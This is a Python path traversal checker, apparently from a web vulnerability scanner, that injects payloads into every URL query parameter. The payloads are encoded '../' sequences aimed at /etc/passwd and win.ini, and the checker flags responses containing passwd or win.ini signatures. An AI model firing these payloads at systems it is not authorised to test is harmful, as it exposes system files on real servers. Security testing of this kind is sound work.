import re
from typing import Optional
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

import requests

PATH_TRAVERSAL_PAYLOADS = [
    "../../../../etc/passwd",
    "..\\..\\..\\windows\\win.ini",
    "....//....//....//etc/passwd",
    "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "../../../../../../etc/passwd",
    "..\\..\\..\\..\\..\\windows\\win.ini",
]

UNIX_SIGNATURES = [
    r"root:[x*]?:0:0:",
    r"\b(daemon|nobody|bin|sys|sync|www-data|backup):[x*]?:[0-9]+:[0-9]+:",
]

WIN_SIGNATURES = [
    r"\[fonts\]",
    r"\[extensions\]",
    r"\[files\]",
    r"for 16-bit app support",
]

DRIVE_PATTERN = re.compile(
    r"\b[A-Za-z]:\\(?:Users|Windows|Program Files|Documents and Settings|WINNT|WINDOWS|System32)\b",
    re.IGNORECASE,
)


def check_path_traversal(url: str, session: Optional[requests.Session] = None) -> list[dict[str, str]]:
    results: list[dict[str, str]] = []
    client = session if session is not None else requests

    parsed = urlparse(url)
    query_params = parse_qs(parsed.query)
    if not query_params:
        return results

    baseline_text = ""
    try:
        r = client.get(url, timeout=6)
        baseline_text = r.text
    except requests.RequestException:
        return results

    for param_name in query_params:
        for payload in PATH_TRAVERSAL_PAYLOADS:
            modified = query_params.copy()
            modified[param_name] = [payload]

            query_str = urlencode(modified, doseq=True)
            test_url = urlunparse((
                parsed.scheme, parsed.netloc, parsed.path,
                parsed.params, query_str, parsed.fragment,
            ))

            try:
                r = client.get(test_url, timeout=6)
                body = r.text
            except requests.RequestException:
                continue

            new_lines = body.replace(baseline_text, "")
            if not new_lines.strip():
                continue

            for sig in UNIX_SIGNATURES:
                if re.search(sig, new_lines) and not re.search(sig, baseline_text):
                    results.append({
                        "vuln": "Path Traversal / Directory Traversal",
                        "risk": "Alto",
                        "detail": f"Contenido de archivo del sistema detectado en parametro '{param_name}' con payload '{payload}'. Firma Unix: '{sig}'"
                    })
                    return results

            for sig in WIN_SIGNATURES:
                if sig.lower() in new_lines.lower() and sig.lower() not in baseline_text.lower():
                    results.append({
                        "vuln": "Path Traversal / Directory Traversal",
                        "risk": "Alto",
                        "detail": f"Contenido de archivo del sistema Windows detectado en parametro '{param_name}' con payload '{payload}'. Firma: '{sig}'"
                    })
                    return results

            drives = DRIVE_PATTERN.findall(new_lines)
            if drives and not DRIVE_PATTERN.findall(baseline_text):
                results.append({
                    "vuln": "Path Traversal / Directory Traversal",
                    "risk": "Alto",
                    "detail": f"Rutas de sistema Windows detectadas en parametro '{param_name}' con payload '{payload}': {', '.join(drives[:3])}"
                })
                return results

    return results
